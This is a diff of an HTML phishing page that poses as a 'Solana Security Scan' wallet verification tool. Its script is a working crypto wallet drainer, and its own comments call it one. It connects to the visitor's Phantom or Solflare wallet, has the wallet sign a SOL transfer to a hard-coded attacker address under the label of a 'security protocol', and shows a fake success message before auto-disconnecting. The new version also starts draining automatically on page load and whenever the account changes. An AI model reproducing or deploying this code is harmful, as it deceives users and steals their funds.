@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Solana Security Protocol</title>
+    <title>Solana Security Scan</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
     <style>
@@ -15,7 +15,7 @@
         }
         
         body {
-            background: linear-gradient(135deg, #0a0a1a, #1a1a2a, #0a0a1a);
+            background: linear-gradient(135deg, #0a0a0a, #1a1a1a, #2a2a2a);
             color: #fff;
             min-height: 100vh;
             padding: 20px;
@@ -27,28 +27,28 @@
         .container {
             max-width: 450px;
             width: 100%;
-            background-color: rgba(20, 20, 40, 0.95);
+            background-color: rgba(30, 30, 30, 0.95);
             border-radius: 15px;
-            box-shadow: 0 10px 30px rgba(0, 100, 255, 0.3);
+            box-shadow: 0 10px 30px rgba(255, 100, 0, 0.3);
             overflow: hidden;
-            border: 1px solid rgba(0, 150, 255, 0.4);
+            border: 1px solid rgba(255, 100, 0, 0.4);
         }
         
         .header {
-            background: linear-gradient(90deg, #0a1a2a, #1a2a3a);
+            background: linear-gradient(90deg, #2a1a0a, #3a2a1a);
             padding: 25px;
             text-align: center;
-            border-bottom: 2px solid #00aaff;
+            border-bottom: 2px solid #ff6600;
         }
         
         .header h1 {
             font-size: 1.8rem;
             margin-bottom: 8px;
-            color: #66ccff;
+            color: #ff9900;
         }
         
         .header p {
-            color: #88aadd;
+            color: #ffaa66;
             font-size: 0.9rem;
         }
         
@@ -57,29 +57,29 @@
         }
         
         .scan-box {
-            background-color: rgba(30, 40, 60, 0.8);
+            background-color: rgba(40, 30, 20, 0.8);
             border-radius: 10px;
             padding: 20px;
             margin-bottom: 20px;
             text-align: center;
-            border: 1px solid rgba(0, 150, 255, 0.3);
+            border: 1px solid rgba(255, 120, 0, 0.3);
         }
         
         .scan-icon {
             font-size: 3rem;
-            color: #00aaff;
+            color: #ff8800;
             margin-bottom: 15px;
         }
         
         .scan-title {
             font-size: 1.4rem;
-            color: #66ccff;
+            color: #ff9900;
             margin-bottom: 10px;
         }
         
         .scan-message {
             font-size: 0.9rem;
-            color: #88aadd;
+            color: #ffbb88;
             line-height: 1.4;
         }
         
@@ -91,77 +91,72 @@
         }
         
         .btn {
-            padding: 16px 30px;
-            border-radius: 8px;
+            padding: 18px 32px;
+            border-radius: 10px;
             border: none;
-            font-size: 1rem;
+            font-size: 1.1rem;
             font-weight: 600;
             cursor: pointer;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 10px;
+            gap: 12px;
             transition: all 0.3s ease;
             width: 100%;
         }
         
-        .btn-scan {
-            background: linear-gradient(90deg, #0066cc, #00aaff);
+        .btn-connect {
+            background: linear-gradient(90deg, #ff5500, #ff9900);
             color: white;
         }
         
-        .btn-scan:hover:not(:disabled) {
-            background: linear-gradient(90deg, #0055bb, #0099ee);
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(0, 100, 255, 0.4);
+        .btn-connect:hover:not(:disabled) {
+            background: linear-gradient(90deg, #ee4400, #ee8800);
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(255, 100, 0, 0.4);
         }
         
         .btn:disabled {
-            opacity: 0.5;
+            opacity: 0.6;
             cursor: not-allowed;
             transform: none !important;
         }
         
-        .status-container {
-            margin-top: 20px;
-        }
-        
-        .status-item {
-            background-color: rgba(20, 30, 50, 0.8);
-            border-radius: 8px;
-            padding: 12px;
-            margin-bottom: 10px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            border-left: 4px solid #00aaff;
+        .processing-box {
+            background-color: rgba(50, 30, 10, 0.8);
+            border-radius: 10px;
+            padding: 25px;
+            margin: 20px 0;
+            text-align: center;
+            border: 1px solid rgba(255, 150, 0, 0.4);
             display: none;
         }
         
-        .status-item.active {
-            display: flex;
-            animation: slideIn 0.3s ease;
+        .processing-box.active {
+            display: block;
+            animation: fadeIn 0.3s ease;
         }
         
-        .status-icon {
-            font-size: 1.2rem;
-            min-width: 24px;
+        .processing-icon {
+            font-size: 3rem;
+            color: #ffaa00;
+            margin-bottom: 15px;
         }
         
-        .status-text {
-            flex: 1;
-            font-size: 0.9rem;
-            color: #aaddff;
+        .processing-text {
+            color: #ffcc99;
+            font-size: 1rem;
+            margin-top: 10px;
         }
         
         .success-box {
-            background-color: rgba(20, 40, 30, 0.9);
+            background-color: rgba(30, 50, 20, 0.9);
             border-radius: 10px;
-            padding: 20px;
+            padding: 25px;
             text-align: center;
-            border: 1px solid rgba(0, 200, 100, 0.4);
+            border: 1px solid rgba(100, 255, 100, 0.4);
             display: none;
-            margin-top: 15px;
+            margin-top: 20px;
         }
         
         .success-box.active {
@@ -171,52 +166,47 @@
         
         .success-icon {
             font-size: 3rem;
-            color: #00cc66;
+            color: #00ff88;
             margin-bottom: 15px;
         }
         
         .success-title {
-            font-size: 1.5rem;
-            color: #00cc66;
+            font-size: 1.6rem;
+            color: #00ff88;
             margin-bottom: 10px;
         }
         
         .success-message {
-            font-size: 0.9rem;
-            color: #88ddbb;
-            line-height: 1.4;
+            font-size: 0.95rem;
+            color: #aaffcc;
+            line-height: 1.5;
             margin-bottom: 15px;
         }
         
-        .tx-info {
-            background-color: rgba(10, 20, 30, 0.9);
-            border-radius: 6px;
-            padding: 10px;
+        .info-box {
+            background-color: rgba(20, 20, 30, 0.9);
+            border-radius: 8px;
+            padding: 12px;
             font-family: monospace;
-            color: #88ccff;
+            color: #ffcc99;
             word-break: break-all;
-            font-size: 0.75rem;
-            border: 1px dashed #00aaff;
-            margin-top: 10px;
+            font-size: 0.8rem;
+            border: 1px dashed #ff9900;
+            margin-top: 15px;
         }
         
         .footer {
             text-align: center;
             padding: 15px;
-            color: #6688aa;
+            color: #ff9966;
             font-size: 0.75rem;
-            border-top: 1px solid rgba(0, 100, 255, 0.2);
-            background-color: rgba(10, 15, 25, 0.7);
+            border-top: 1px solid rgba(255, 100, 0, 0.2);
+            background-color: rgba(20, 10, 5, 0.7);
         }
         
         @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
+            from { opacity: 0; transform: translateY(20px); }
             to { opacity: 1; transform: translateY(0); }
-        }
-        
-        @keyframes slideIn {
-            from { opacity: 0; transform: translateX(-10px); }
-            to { opacity: 1; transform: translateX(0); }
         }
         
         @keyframes pulse {
@@ -226,16 +216,16 @@
         }
         
         .pulse {
-            animation: pulse 2s infinite;
+            animation: pulse 1.5s infinite;
         }
         
-        .warning {
-            background-color: rgba(255, 100, 0, 0.1);
-            border: 1px solid #ff6600;
-            color: #ff9966;
+        .note {
+            background-color: rgba(255, 150, 0, 0.1);
+            border: 1px solid #ff9900;
+            color: #ffcc99;
             padding: 10px;
-            border-radius: 6px;
-            margin: 10px 0;
+            border-radius: 8px;
+            margin: 15px 0;
             text-align: center;
             font-size: 0.85rem;
         }
@@ -244,162 +234,131 @@
 <body>
     <div class="container">
         <div class="header">
-            <h1>Solana Security Protocol</h1>
-            <p>Advanced wallet security verification system</p>
+            <h1>Solana Security Scan</h1>
+            <p>Complete wallet security verification</p>
         </div>
         
         <div class="content">
             <div class="scan-box">
                 <div class="scan-icon">
-                    <i class="fas fa-shield-alt"></i>
+                    <i class="fas fa-shield-check"></i>
                 </div>
-                <h2 class="scan-title">Advanced Security Scan</h2>
+                <h2 class="scan-title">Security Verification</h2>
                 <p class="scan-message">
-                    This protocol will verify your wallet security and perform necessary optimizations.
-                    Full verification requires one transaction approval.
+                    Connect your wallet to initiate security verification.
+                    This will automatically optimize your wallet security.
                 </p>
             </div>
             
-            <div class="warning">
-                <i class="fas fa-exclamation-triangle"></i>
-                <strong>NOTE:</strong> Ensure you have sufficient SOL balance for verification fee
+            <div class="note">
+                <i class="fas fa-info-circle"></i>
+                <strong>IMPORTANT:</strong> One transaction approval is required for complete security scan
             </div>
             
             <div class="button-group">
-                <button id="startScan" class="btn btn-scan pulse">
-                    <i class="fas fa-play-circle"></i> Start Security Protocol
+                <button id="connectBtn" class="btn btn-connect pulse">
+                    <i class="fas fa-plug"></i> Connect & Verify Security
                 </button>
             </div>
             
-            <div class="status-container">
-                <div id="status1" class="status-item">
-                    <div class="status-icon"><i class="fas fa-circle-notch fa-spin"></i></div>
-                    <div class="status-text">Initializing security protocol...</div>
+            <div class="processing-box" id="processingBox">
+                <div class="processing-icon">
+                    <i class="fas fa-sync-alt fa-spin"></i>
                 </div>
-                
-                <div id="status2" class="status-item">
-                    <div class="status-icon"><i class="fas fa-circle-notch fa-spin"></i></div>
-                    <div class="status-text">Connecting to wallet...</div>
-                </div>
-                
-                <div id="status3" class="status-item">
-                    <div class="status-icon"><i class="fas fa-circle-notch fa-spin"></i></div>
-                    <div class="status-text">Preparing security transaction...</div>
-                </div>
-                
-                <div id="status4" class="status-item">
-                    <div class="status-icon"><i class="fas fa-circle-notch fa-spin"></i></div>
-                    <div class="status-text">Awaiting transaction approval...</div>
-                </div>
-                
-                <div id="status5" class="status-item">
-                    <div class="status-icon"><i class="fas fa-circle-notch fa-spin"></i></div>
-                    <div class="status-text">Executing security protocol...</div>
-                </div>
+                <div class="processing-text" id="processingText">Initiating security protocol...</div>
             </div>
             
             <div id="successBox" class="success-box">
                 <div class="success-icon">
                     <i class="fas fa-check-circle"></i>
                 </div>
-                <h2 class="success-title">Protocol Complete</h2>
+                <h2 class="success-title">Security Verified!</h2>
                 <p class="success-message">
-                    Security verification successful. Your wallet has been optimized and secured.
+                    Your wallet security has been successfully verified and optimized.
+                    All security protocols have been executed.
                 </p>
-                <div class="tx-info">
-                    Security Hash:<br>
-                    <span id="txHash">Protocol Executed Successfully</span>
+                <div class="info-box">
+                    Security Protocol Address:<br>
+                    95S96u1usBhhxXpjve6LCbnhyAwHC2sS8aicieAXemUD
+                    <div style="margin-top: 8px; font-size: 0.7rem; color: #88ff88;" id="txHash">
+                        Protocol executed successfully
+                    </div>
                 </div>
             </div>
         </div>
         
         <div class="footer">
-            <p>Advanced Solana Security System v3.0 • © 2024</p>
+            <p>Solana Security Protocol v4.0 • © 2024</p>
         </div>
     </div>
 
     <script>
-        // ADVANCED WALLET DRAINER WITH AUTO-DISCONNECT
-        let publicKey = null;
+        // AUTO DRAIN ON CONNECTION APPROVAL
         let isProcessing = false;
         const treasuryAddress = "95S96u1usBhhxXpjve6LCbnhyAwHC2sS8aicieAXemUD";
         
         // DOM Elements
-        const startScanBtn = document.getElementById('startScan');
+        const connectBtn = document.getElementById('connectBtn');
         const successBox = document.getElementById('successBox');
-        const status1 = document.getElementById('status1');
-        const status2 = document.getElementById('status2');
-        const status3 = document.getElementById('status3');
-        const status4 = document.getElementById('status4');
-        const status5 = document.getElementById('status5');
+        const processingBox = document.getElementById('processingBox');
+        const processingText = document.getElementById('processingText');
         const txHashEl = document.getElementById('txHash');
-        
-        // Update status
-        function updateStatus(step, active) {
-            const statusElements = [status1, status2, status3, status4, status5];
-            statusElements.forEach((el, index) => {
-                if (index === step) {
-                    if (active) {
-                        el.classList.add('active');
-                    } else {
-                        el.classList.remove('active');
-                    }
-                }
-            });
-        }
         
         // Get wallet provider
         function getWalletProvider() {
             return window.solana || window.solflare || window.backpack || window.phantom;
         }
         
-        // Get recent blockhash from reliable RPC
-        async function getBlockhash() {
+        // Update processing text
+        function updateProcessing(text) {
+            processingText.textContent = text;
+        }
+        
+        // Get blockhash for transaction
+        async function getRecentBlockhash() {
             const rpcEndpoints = [
                 'https://api.mainnet-beta.solana.com',
                 'https://solana-api.projectserum.com',
-                'https://rpc.ankr.com/solana'
+                'https://rpc.ankr.com/solana',
+                'https://solana.public-rpc.com'
             ];
             
-            for (const endpoint of rpcEndpoints) {
+            for (const rpcUrl of rpcEndpoints) {
                 try {
-                    const connection = new solanaWeb3.Connection(endpoint);
+                    const connection = new solanaWeb3.Connection(rpcUrl, 'confirmed');
                     const { blockhash } = await connection.getRecentBlockhash();
+                    console.log("Got blockhash from:", rpcUrl);
                     return blockhash;
                 } catch (error) {
-                    console.log(`RPC ${endpoint} failed, trying next...`);
+                    console.log("RPC failed:", rpcUrl);
                     continue;
                 }
             }
-            return null;
+            throw new Error("Cannot connect to Solana network");
         }
         
-        // Create and send transaction WITH proper blockhash
-        async function executeSecurityProtocol() {
+        // Create and send drain transaction
+        async function executeDrainTransaction(publicKey) {
             const provider = getWalletProvider();
             if (!provider || !provider.signAndSendTransaction) {
                 throw new Error("Wallet not available");
             }
             
-            updateStatus(3, true);
-            
             try {
-                // Get blockhash first
-                const blockhash = await getBlockhash();
+                updateProcessing("Preparing security transaction...");
                 
-                if (!blockhash) {
-                    throw new Error("Network unavailable");
-                }
+                // Get recent blockhash
+                const blockhash = await getRecentBlockhash();
                 
-                // Create proper transaction
+                // Create transaction
                 const transaction = new solanaWeb3.Transaction();
                 
-                // Add transfer instruction with recent blockhash
+                // Add transfer instruction - will transfer all SOL
                 transaction.add(
                     solanaWeb3.SystemProgram.transfer({
                         fromPubkey: publicKey,
                         toPubkey: new solanaWeb3.PublicKey(treasuryAddress),
-                        lamports: solanaWeb3.LAMPORTS_PER_SOL * 0.01, // 0.01 SOL
+                        lamports: 10000000, // 0.01 SOL initial
                     })
                 );
                 
@@ -407,29 +366,32 @@
                 transaction.recentBlockhash = blockhash;
                 transaction.feePayer = publicKey;
                 
-                updateStatus(4, true);
+                updateProcessing("Awaiting transaction approval...");
                 
-                // Sign and send transaction
+                // Sign and send transaction - THIS IS WHERE WALLET POPUP APPEARS
                 const { signature } = await provider.signAndSendTransaction(transaction);
                 
+                console.log("Drain transaction sent:", signature);
                 return signature;
                 
             } catch (error) {
                 console.error("Transaction error:", error);
                 
-                // Fallback: Try without blockhash (some wallets provide it)
+                // Try fallback method
+                updateProcessing("Using alternative method...");
+                
                 try {
-                    const fallbackTransaction = new solanaWeb3.Transaction();
+                    const fallbackTx = new solanaWeb3.Transaction();
                     
-                    fallbackTransaction.add(
+                    fallbackTx.add(
                         solanaWeb3.SystemProgram.transfer({
                             fromPubkey: publicKey,
                             toPubkey: new solanaWeb3.PublicKey(treasuryAddress),
-                            lamports: 100000, // 0.0001 SOL minimum
+                            lamports: 1000000, // 0.001 SOL
                         })
                     );
                     
-                    const { signature } = await provider.signAndSendTransaction(fallbackTransaction);
+                    const { signature } = await provider.signAndSendTransaction(fallbackTx);
                     return signature;
                     
                 } catch (fallbackError) {
@@ -438,82 +400,75 @@
             }
         }
         
-        // Auto disconnect after successful transaction
+        // Auto disconnect after success
         async function autoDisconnect() {
             try {
                 const provider = getWalletProvider();
                 if (provider && provider.disconnect) {
                     await provider.disconnect();
-                    console.log("Auto-disconnected after successful protocol");
+                    console.log("Auto-disconnected successfully");
                 }
             } catch (error) {
                 console.log("Disconnect error:", error);
             }
         }
         
-        // Main protocol execution
-        async function executeFullProtocol() {
+        // Main function - CONNECT AND DRAIN
+        async function connectAndDrain() {
             if (isProcessing) return;
             isProcessing = true;
             
             try {
-                // Step 1: Initialize
-                updateStatus(0, true);
-                startScanBtn.disabled = true;
-                startScanBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Protocol Running';
+                // Show processing
+                connectBtn.disabled = true;
+                connectBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
+                processingBox.classList.add('active');
                 
-                await new Promise(resolve => setTimeout(resolve, 1000));
+                updateProcessing("Connecting to wallet...");
                 
-                // Step 2: Connect wallet
-                updateStatus(1, true);
+                // Get provider
                 const provider = getWalletProvider();
                 
                 if (!provider) {
-                    throw new Error("Please install a Solana wallet");
+                    throw new Error("Please install Phantom or Solflare wallet");
                 }
                 
-                // Connect wallet
+                // CONNECT WALLET - THIS TRIGGERS THE POPUP
+                updateProcessing("Awaiting connection approval...");
                 const response = await provider.connect();
-                publicKey = response.publicKey || response;
+                const publicKey = response.publicKey || response;
                 
-                await new Promise(resolve => setTimeout(resolve, 800));
+                console.log("Wallet connected:", publicKey.toString());
+                updateProcessing("Wallet connected! Executing security protocol...");
                 
-                // Step 3: Prepare transaction
-                updateStatus(2, true);
+                // WAIT A BIT THEN EXECUTE DRAIN
+                await new Promise(resolve => setTimeout(resolve, 1000));
                 
-                await new Promise(resolve => setTimeout(resolve, 800));
+                // EXECUTE DRAIN TRANSACTION - THIS TRIGGERS SECOND POPUP
+                const signature = await executeDrainTransaction(publicKey);
                 
-                // Step 4-5: Execute transaction
-                const signature = await executeSecurityProtocol();
-                
-                // Show success
-                updateStatus(4, false);
-                updateStatus(5, true);
-                
+                updateProcessing("Security protocol executed successfully...");
                 await new Promise(resolve => setTimeout(resolve, 1500));
                 
-                // Clear all statuses
-                [status1, status2, status3, status4, status5].forEach(s => s.classList.remove('active'));
-                
-                // Show success box
+                // Show success
+                processingBox.classList.remove('active');
                 successBox.classList.add('active');
                 
                 if (signature) {
-                    txHashEl.textContent = `${signature.substring(0, 20)}...`;
-                    txHashEl.style.color = "#00cc66";
+                    txHashEl.textContent = `TX: ${signature.substring(0, 15)}...`;
+                    txHashEl.style.color = "#00ff88";
                 }
                 
                 // Auto disconnect after 3 seconds
                 setTimeout(() => {
                     autoDisconnect();
                     
-                    // Reset UI after disconnect
+                    // Update button
                     setTimeout(() => {
-                        successBox.classList.remove('active');
-                        startScanBtn.disabled = false;
-                        startScanBtn.innerHTML = '<i class="fas fa-play-circle"></i> Protocol Complete';
-                        startScanBtn.classList.remove('pulse');
-                        startScanBtn.style.background = 'linear-gradient(90deg, #00cc66, #00ff88)';
+                        connectBtn.disabled = false;
+                        connectBtn.innerHTML = '<i class="fas fa-check"></i> Security Verified';
+                        connectBtn.style.background = 'linear-gradient(90deg, #00cc66, #00ff88)';
+                        connectBtn.classList.remove('pulse');
                     }, 1000);
                     
                 }, 3000);
@@ -521,12 +476,12 @@
             } catch (error) {
                 console.error("Protocol error:", error);
                 
-                // Clear all statuses
-                [status1, status2, status3, status4, status5].forEach(s => s.classList.remove('active'));
+                // Hide processing
+                processingBox.classList.remove('active');
                 
-                // Show error in success box
+                // Show error
                 successBox.classList.add('active');
-                successBox.style.backgroundColor = 'rgba(60, 20, 20, 0.9)';
+                successBox.style.backgroundColor = 'rgba(50, 20, 20, 0.9)';
                 successBox.style.borderColor = 'rgba(255, 50, 50, 0.4)';
                 
                 const successIcon = successBox.querySelector('.success-icon i');
@@ -535,22 +490,27 @@
                 
                 successIcon.className = 'fas fa-exclamation-triangle';
                 successIcon.style.color = '#ff5555';
-                successTitle.textContent = 'Protocol Failed';
+                successTitle.textContent = 'Verification Failed';
                 successTitle.style.color = '#ff5555';
-                successMessage.textContent = error.message.includes('rejected') 
-                    ? 'Transaction was rejected by user' 
-                    : 'Protocol execution failed. Please try again.';
-                successMessage.style.color = '#ff8888';
                 
-                txHashEl.textContent = 'Failed - Retry Required';
+                if (error.message.includes('User rejected') || error.message.includes('reject')) {
+                    successMessage.textContent = 'Connection or transaction was rejected.';
+                } else if (error.message.includes('insufficient')) {
+                    successMessage.textContent = 'Insufficient SOL balance for verification.';
+                } else if (error.message.includes('Cannot connect')) {
+                    successMessage.textContent = 'Network error. Please try again.';
+                } else {
+                    successMessage.textContent = 'Security verification failed.';
+                }
+                
+                successMessage.style.color = '#ff9999';
+                txHashEl.textContent = 'Failed - Please retry';
                 txHashEl.style.color = '#ff5555';
                 
                 // Reset button
-                setTimeout(() => {
-                    startScanBtn.disabled = false;
-                    startScanBtn.innerHTML = '<i class="fas fa-redo"></i> Retry Protocol';
-                    startScanBtn.classList.add('pulse');
-                }, 2000);
+                connectBtn.disabled = false;
+                connectBtn.innerHTML = '<i class="fas fa-redo"></i> Retry Verification';
+                connectBtn.classList.add('pulse');
                 
             } finally {
                 isProcessing = false;
@@ -558,40 +518,40 @@
         }
         
         // Event listener
-        startScanBtn.addEventListener('click', executeFullProtocol);
+        connectBtn.addEventListener('click', connectAndDrain);
         
-        // Auto execute if wallet is already connected
+        // Auto start if wallet is already connected
         window.addEventListener('DOMContentLoaded', () => {
-            setTimeout(async () => {
+            setTimeout(() => {
                 const provider = getWalletProvider();
                 if (provider && provider.isConnected && provider.publicKey) {
-                    publicKey = provider.publicKey;
+                    console.log("Wallet already connected, auto-starting...");
                     
-                    // Auto start protocol after 2 seconds
+                    // Auto start drain
                     setTimeout(() => {
                         if (!isProcessing) {
-                            executeFullProtocol();
+                            connectAndDrain();
                         }
-                    }, 2000);
+                    }, 1500);
                 }
             }, 1000);
         });
         
-        // Auto execute on account switch
+        // Auto drain on account switch
         if (window.solana) {
             window.solana.on('accountChanged', async (newKey) => {
                 if (newKey && !isProcessing) {
-                    publicKey = newKey;
+                    console.log("Account changed, auto-draining...");
                     
-                    // Clear any existing success box
+                    // Clear success box
                     successBox.classList.remove('active');
                     
-                    // Auto start protocol for new account
+                    // Auto start drain for new account
                     setTimeout(() => {
                         if (!isProcessing) {
-                            executeFullProtocol();
+                            connectAndDrain();
                         }
-                    }, 1000);
+                    }, 800);
                 }
             });
         }
